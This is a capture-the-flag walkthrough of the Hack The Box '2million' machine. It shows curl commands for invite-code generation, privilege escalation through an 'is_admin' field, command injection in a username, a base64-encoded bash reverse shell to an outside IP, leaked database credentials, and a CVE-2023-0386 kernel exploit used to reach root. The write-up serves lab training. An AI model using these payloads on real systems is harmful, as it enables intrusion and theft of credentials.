Running `nmap`, there are two ports open, 22, and 80 running ssh and http respectively. 

When I visit the target ip, I find the url is called `2million.htb`. I add this url to the hosts list,

```
echo '10.10.10.11 2million.htb' | sudo tee -a /etc/hosts
```

Visiting the `/invite` page, I find the javascript file `inviteapi.min.js` in the page source code. In the javascript code, there is a function `makeInviteCode` that returns base64 encrypted data. In the function there is a POST to a url `/api/v1/invite/how/to/generate`. Using this information we can use `curl` to probe the web application and get additional data, the invite code, cookies, etcetera.

```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

From the above curl we get a hint via a ROT13 encrypted data, that to generate an invite code, make a POST request to `/api/v1/invite/generate`

```
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

We receive the code `U1oyN0ktUTVaOVMtREtOSVgtUDNDU00`, which if I run a base64 decryption, I get the invite code, `SZ27I-Q5Z9S-DKNIX-P3CSM`.

I insert the code into the `/invite` page and am redirected to the `register` page. I input a username, email, and password and can sign in through the `/login` page.

After logging in, if I access the `Access` tab and turn on Burp Suite to catch the next http request. I click on the `Connection Pack` button on the `Access` page and see that the GET request is to `/api/v1/user/vpn/generate` and a cookie is generated `PHPSESSID=nufb0km8892s1t9kraqhqiecj6`.

When I attempt to curl `/api` I get a 401 error:

```
curl -sv 2million.htb/api
```

This time I attempt a curl with the cookie I got earlier:

```
  curl -sv 2million.htb/api --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

As a response I get the endpoint `v1`, and I attempt to curl that next:

```
curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

I get the responses, `/api/v1/admin/auth`, `api/v1/admin/vpn/generate`, `/api/v1/admin/settings/update`, so I will try those next.

```
curl http://2million.htb/api/v1/admin/auth --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

The above command returns false, as we are not currently an administrative user.

```
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6"
```

I get a 401 unauthorized error as I'm not an admin yet.

```
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

This command works, but tells me that I am missing an email parameter.

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"email":"test@2million.htb"}' | jq

{
  "status": "danger",
  "message": "Missing parameter: is_admin"

}
```

I get an error I am missing the parameter `is_admin`.

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"email":"test@2million.htb", "is_admin": '1'}' | jq

{
  "id": 13,
  "username": "test",
  "is_admin": 1

}
```

This was successful, now I authenticate:

```
curl http://2million.htb/api/v1/admin/auth --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq

{
  "message": true

}
```

Now I curl the `/generate` endpoint:

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"username":"test"}'

client
dev tun
proto udp
remote edge-eu-release-1.hackthebox.eu 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
<SNIP>
```

Since a VPN configuration file was generated for the user, the php file that generated it could be vulnerable to inject malicious code to gain command execution on the remote system. Let's test this by adding `;id;` to the username field.

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"username":"test;id;"}'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This is successful. I start a netcat listener: and inject a shell with the following payload:

```
nc -lnvp 1234
```

 and inject a shell with the following payload:

```
bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
```

But the payload must be encrypted via base64:

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= |
base64 -d | bash;"}'
```

This is a success and I get shell access on the web-server.

On the server, I find admin credentials in the `.env` file 

```
www-data@2million:/var/www/html$ cat .env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

I run `ssh` with the above credentials to login to admin.

After logging in as admin, there is an email in the path `/var/mail/admin`, in the email I find there is a vulnerability on `overlay fuse`, a google search reveals CVE-2023-0386 and vulnerability is in the linux kernel.

Running the following commands I get details on the Operating System:

```
admin@ubuntu:~$ uname -a

Linux ubuntu 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022
x86_64 x86_64 x86_64 GNU/Linux

$ lsb_release -a

No LSB modules are available.
Distributor ID: Ubuntu
Description:  Ubuntu 22.04.2 LTS
Release:  22.04

Codename: jammy
```

There is an exploit available on github:

```
  $ git clone https://github.com/xkaneiki/CVE-2023-0386
```

Unzip:

```
  zip -r cve.zip CVE-2023-0386
```

Upload the contents using scp:

```
scp cve.zip admin@2million.htb:/tmp
```

Run the following commands:

```
$ cd /tmp
$ unzip cve.zip
$ cd /tmp/CVE-2023-0386/
$ make all
$ ./fuse ./ovlcap/lower ./gc &
$ ./exp
$ whoami
root
```

Now we have root access and can run `cat /root/root.txt` to get the flag.